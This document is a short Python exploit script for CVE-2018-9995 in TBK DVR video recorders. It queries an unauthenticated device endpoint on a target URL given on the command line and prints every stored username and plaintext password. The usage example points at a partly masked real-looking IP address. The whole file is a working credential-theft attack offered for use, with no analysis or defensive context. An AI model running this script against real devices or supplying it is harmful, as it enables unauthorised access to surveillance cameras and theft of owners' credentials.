#!/usr/bin/env python3
# CVE-2018-9995 EXP

import requests
import json
import sys

if len(sys.argv) < 2:
    print("""
    sys.argv[0]
    Get TBK DVR uid and pwd (CVE-2018-9995 EXP)
    usage:
        sys.argv[0] URL
    eg.
        sys.argv[0] http://23.126.211.***:85
        """)
else:
    url = sys.argv[1]
    dvr = url + "/device.rsp?opt=user&cmd=list"

    try:
        response = requests.get(dvr, timeout = 30)
        response.raise_for_status()
    except:
        print("HTTP Error!")

    data = json.loads(response.text)["list"]

    for userinfo in data:
        uid = userinfo["uid"]
        pwd = userinfo["pwd"]

        print("\033[32m[+] uid : {:<10} pwd : {}\033[0m".format(uid, pwd))
